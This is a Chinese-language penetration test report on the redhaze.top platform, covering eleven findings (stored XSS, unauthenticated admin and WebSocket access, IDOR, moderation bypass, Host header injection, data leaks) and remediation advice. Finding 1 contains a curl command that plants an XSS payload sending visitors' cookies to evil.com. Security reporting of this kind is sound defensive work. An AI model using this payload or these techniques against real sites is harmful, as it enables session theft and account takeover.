# 红幕科技 RedHaze.top 安全评估报告

**评估日期**: 2026-06-18
**目标范围**: redhaze.top 及其子系统
**评估方法**: 黑盒渗透测试（已授权）
**Nginx版本**: nginx/1.24.0 (Ubuntu)
**应用版本**: v0.6.4+0acb4ea

## 目标架构

```
redhaze.top → id.redhaze.top (统一身份认证门户)
├─ id.redhaze.top     — RedHaze ID (身份中心)
├─ mall.redhaze.top   — 红雾商城 (零售系统)
├─ desk.redhaze.top   — 红雾工单 (工单系统)
├─ ads.redhaze.top    — 红雾广告 (广告平台)
├─ bbs.redhaze.top    — 红雾CMS (内容中心)
└─ chat.redhaze.top   — 红雾消息 (实时聊天)
```

## 漏洞总结

共发现 **11 个安全漏洞**，包括存储型 XSS、信息泄露、未授权访问、IDOR、审批绕过等。

---

## 漏洞 1: [高危] 红雾聊天系统存储型 XSS

**位置**: `chat.redhaze.top/chat/channels/free-lobby`

**描述**: 红雾消息中心的自由频道允许未认证访客发送消息，消息内容通过 `innerHTML` 直接渲染到页面，导致存储型 XSS。

**证据**: 
聊天历史中已存在恶意 payload：
```html
<div class="body"><img src=x onerror=alert('CHAT_XSS_8f2a')></div>
```
消息通过 WebSocket (`ws://chat.redhaze.top/ws/chat/free-lobby`) 或 HTTP POST `/api/chat/channels/free-lobby/messages` 发送，未经任何 sanitization。

**利用方式**:
```bash
curl -X POST https://chat.redhaze.top/api/chat/channels/free-lobby/messages \
  -H "Content-Type: application/json" \
  -d '{"body":"<img src=x onerror=fetch(`https://evil.com/?c=`+document.cookie)>"}'
```

**影响**: 攻击者可窃取任意访客（包括已登录员工/管理员）的 Cookie 和会话令牌，完全接管账户。

---

## 漏洞 2: [高危] 商城产品存储型 XSS

**位置**: `mall.redhaze.top/mall/products/35`

**描述**: 商城产品 "XSS Product Test" (SKU SKU-AD-XSS-PRODUCT-TEST) 的产品图片 URL 包含 XSS payload，且在多个位置渲染：
```html
<img src="https://x.com/x.jpg%22%20onerror=%22alert%281%29" alt="XSS Product Test" />
```
其中 `%22` 解码后为 `"`，实际渲染为：
```html
<img src="https://x.com/x.jpg" onerror="alert(1)" alt="XSS Product Test" />
```
`onerror` 事件触发即执行 JavaScript。

**影响**: 访问该产品页面的用户（包括管理员）将执行攻击者注入的脚本。

---

## 漏洞 3: [中危] 工单运维管理页面未授权访问

**位置**: `desk.redhaze.top/desk/admin`

**描述**: 工单系统的运维管理页面 `/desk/admin` 无需任何认证即可访问，直接暴露了以下功能：
- **Webhook 注册表单**: 可注册任意目标 URL 的 webhook（含可选 HMAC 密钥）
- **通知模板编辑器**: 可编辑 Go html/template 语法模板（潜在 SSTI 向量）

**证据**: 直接访问 `https://desk.redhaze.top/desk/admin` 返回完整管理界面，状态为"匿名访客"。

**影响**: 
- 恶意 webhook 注册可用于 SSRF 攻击和数据外泄
- 模板编辑器存在服务器端模板注入 (SSTI) 风险

---

## 漏洞 4: [中危] CMS 待审核内容 API 信息泄露

**位置**: `bbs.redhaze.top/api/cms/posts/{id}`

**描述**: CMS 系统的 API 端点 `/api/cms/posts/{id}` 在未认证状态下可访问待审核（pending）的帖子内容，返回完整的 JSON 数据，包含作者信息、帖子标题、正文 HTML、状态等。

**证据**:
```json
// POST #17 (pending, announcement)
{"author_kind":"anonymous","author_label":"匿名访客",
 "body_html":"<p>test</p>","status":"pending",
 "title":"Test announcement"}

// POST #18 (pending, tech-blog)
{"author_kind":"anonymous","author_label":"匿名访客",
 "body_html":"<p>No-auth post to tech-blog section</p>","status":"pending",
 "title":"SECURITY PoC - tech blog"}

// POST #19 (pending, vendor-feedback)
{"author_kind":"anonymous","author_label":"匿名访客",
 "body_html":"<p>No-auth post to vendor-feedback section</p>","status":"pending",
 "title":"SECURITY PoC - vendor feedback"}
```
虽然 HTML 页面返回 404，但 JSON API 直接暴露了这些内容。

**影响**: 攻击者可遍历 post ID 获取所有待审核内容，可能包含敏感信息。

---

## 漏洞 5: [中危] 广告平台 Campaign 数据未授权访问

**位置**: `ads.redhaze.top/api/ads/campaigns/{id}`

**描述**: 广告平台的 API 端点 `/api/ads/campaigns/{id}` 无需认证即可访问，返回完整的 campaign 数据，包括广告主 ID、预算、计费金额、目标 URL 等敏感商业数据。

**证据**:
```json
// Campaign #17 (UNAUTH_TEST)
{"campaign":{
  "ID":17,"AdvertiserID":1,"AdvertiserNo":"ADV-JET-001",
  "Name":"UNAUTH_TEST","Vertical":"jet",
  "BudgetTotal":100,"BilledAmount":0,"BidPerClick":1,
  "Status":"running","TargetURL":"https://example.com",
  "Geo":"global","Premium":false
}}
```

**影响**: 竞争对手可获取广告投放策略、预算数据和目标落地页信息。

---

## 漏洞 6: [中危] CMS 访客直接发布绕过审核

**位置**: `bbs.redhaze.top/cms/posts/20`

**描述**: CMS 系统存在审核绕过漏洞，未登录访客提交的帖子可绕过"待审核"状态直接发布。Post #20 "GUEST PoC - tech blog" 由访客 G-cb117318 发布，正文说明 "Guest post to tech-blog - direct publish"，明确证实了审核绕过。

**证据**:
- 作者: 访客 · G-cb117318
- 板块: 技术博客
- 状态: 已发布
- 正文: "Guest post to tech-blog - direct publish"

对比正常流程中帖子应为 "pending" 状态（如 posts #17-19）。

**影响**: 攻击者可绕过内容审核直接发布垃圾信息、钓鱼内容或恶意脚本。

---

## 漏洞 7: [中危] CMS 作者身份伪造 (IDOR)

**位置**: `bbs.redhaze.top/cms/posts/12, 13`

**描述**: CMS 系统存在不安全的直接对象引用 (IDOR)，允许攻击者伪造帖子作者身份。Post #12 "POST-IDOR-CMS-1" 和 Post #13 "POST-IDOR-CMS-2" 明确测试了此漏洞，post #13 的正文为 "author spoof"。

**证据**:
- Post #13: "POST-IDOR-CMS-2" · 作者: 访客 · G-037af392 · 正文: "author spoof"
- 两篇帖子均以不同访客身份发布，表明存在跨用户身份伪造能力

**影响**: 攻击者可冒充其他用户（包括管理员或员工）发布内容，制造虚假信息。

---

## 漏洞 8: [中危] Host Header 注入导致会话劫持

**位置**: 全局（通过 Host header）

**描述**: CMS Post #16 的正文明确指出 "This post was created with guest cookie via Host header injection - security assessment PoC"，证实 Host Header 注入可用于窃取用户 Cookie 并以受害者身份执行操作。

**证据**:
- Post #16: "GUEST CMS PoC TEST" · 板块: 公司公告 · 状态: 已发布
- 正文: "This post was created with guest cookie via Host header injection - security assessment PoC"

**影响**: 攻击者可通过 Host header 注入窃取用户 Cookie，实现账户劫持。在共享托管环境中影响更大。

---

## 漏洞 9: [低危] 商城被入侵产品（负库存）

**位置**: `mall.redhaze.top/mall/products/30`

**描述**: 商城存在一个明显被入侵的产品 "HACKED PRODUCT 4" (SKU SKU-AD-HACKED-PRODUCT-4)，库存显示为 **-1**，价格为 ¥0.01。该产品名称和状态表明系统已被攻击者操控。

**证据**:
- 产品名: "HACKED PRODUCT 4"
- SKU: SKU-AD-HACKED-PRODUCT-4
- 库存: -1（不可能的业务状态）
- 价格: ¥0.01
- 供应商: VND-CN-001

另外还有产品 28（跨供应商伪造）、产品 31/32/34（spoof 产品）等异常产品。

**影响**: 表明系统已被入侵或存在严重的数据完整性漏洞，攻击者可操纵产品数据和库存。

---

## 漏洞 10: [中危] 未认证 WebSocket 访问聊天系统

**位置**: `wss://chat.redhaze.top/ws/chat/free-lobby`

**描述**: 聊天系统的 WebSocket 端点无需认证即可连接和发送消息。访客 G-037af392 通过 WebSocket 发送了测试消息：
```json
{"type":"message","text":"WS-POC-test-from-unauth","channel":"free-lobby"}
```

**利用方式**: 直接连接 `wss://chat.redhaze.top/ws/chat/free-lobby` 即可发送任意消息。

**影响**: 攻击者可发送垃圾消息、社会工程攻击 payload，或利用 XSS payload（见漏洞 1）攻击所有频道参与者。

---

## 漏洞 11: [低危] 广告平台测试 Campaign 暴露

**位置**: `ads.redhaze.top/ads`

**描述**: 广告平台首页公开列出 20 个 campaign，包括多个测试和安全测试 campaign：
- Campaign #17: "UNAUTH_TEST" - 未授权访问测试
- Campaign #18: "CROSS_ADV_TEST" - 预算 ¥999,999.00
- Campaign #19: "VENDOR_POC" - 供应商漏洞验证
- Campaign #20: "PROXY_POC_TEST" 

这些测试 campaign 暴露了平台进行安全测试的痕迹，且可被外部访问。

**影响**: 泄露内部安全测试活动信息，测试数据可能被利用进行进一步攻击。

---

## 风险矩阵

| # | 漏洞 | 严重性 | 可利用性 | 影响 |
|---|------|--------|----------|------|
| 1 | Chat 存储型 XSS | **高** | 无需认证 | 账户劫持 |
| 2 | Mall 产品 XSS | **高** | 无需认证 | 账户劫持 |
| 3 | Desk 管理页面未授权 | **中** | 无需认证 | SSRF/SSTI |
| 4 | CMS 待审内容泄露 | **中** | 无需认证 | 信息泄露 |
| 5 | Ads Campaign 泄露 | **中** | 无需认证 | 商业机密泄露 |
| 6 | CMS 审核绕过 | **中** | 无需认证 | 内容投毒 |
| 7 | CMS IDOR/作者伪造 | **中** | 需访客身份 | 身份伪造 |
| 8 | Host Header 注入 | **中** | 无需认证 | 会话劫持 |
| 9 | Mall 被入侵产品 | **低** | 已发生 | 数据完整性 |
| 10 | WebSocket 未认证 | **中** | 无需认证 | 信息投毒 |
| 11 | Ads 测试数据暴露 | **低** | 无需认证 | 信息泄露 |

---

## 修复建议

1. **XSS 防护 (漏洞 1, 2)**: 对所有用户输入使用 `textContent` 替代 `innerHTML`，或使用 DOMPurify/sanitize-html 进行输出编码。
2. **认证控制 (漏洞 3, 10)**: 为 `/desk/admin` 和 WebSocket 端点添加认证中间件。
3. **API 授权 (漏洞 4, 5)**: 对 CMS 和 Ads API 添加访问控制，待审核内容仅作者和管理员可见。
4. **CMS 审核流程 (漏洞 6)**: 修复审核绕过逻辑，确保所有未登录帖子进入待审核状态。
5. **IDOR 修复 (漏洞 7)**: 在后端验证作者身份，不允许客户端指定 author 字段。
6. **Host Header 验证 (漏洞 8)**: 配置 Nginx 使用白名单验证 Host header，移除对 `X-Forwarded-Host` 的信任。
7. **数据清理 (漏洞 9, 11)**: 清理被入侵产品和测试数据，审查数据完整性。
